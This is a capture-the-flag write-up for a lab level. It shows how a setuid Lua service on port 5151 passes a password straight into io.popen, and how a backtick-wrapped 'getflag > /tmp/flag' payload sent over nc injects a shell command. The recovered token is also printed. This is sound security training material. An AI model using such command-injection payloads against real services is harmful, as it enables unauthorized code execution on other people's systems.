solution level11:

> ls -l
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua

we have a lua program that checks for a connection on port 5151
the server asks for a password, and then passes it through a sha1 hash function

it may seem like the solution is to send the right password to the hash function,
but we are only interested in getting the output of getflag

-> we can do that with some code injection:
"prog = io.popen("echo "..pass.." | sha1sum", "r")

io.popen(prog[,mode])
Starts program prog in a separated process and returns a file handle that you can use to read data
from this program (if mode is "r", the default) or to write data to this program (if mode is "w").

we can execute the getflag command with echo and write the output to a file we can read

> nc localhost 5151
> Password: `getflag > /tmp/flag`

> cat /tmp/flag

Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
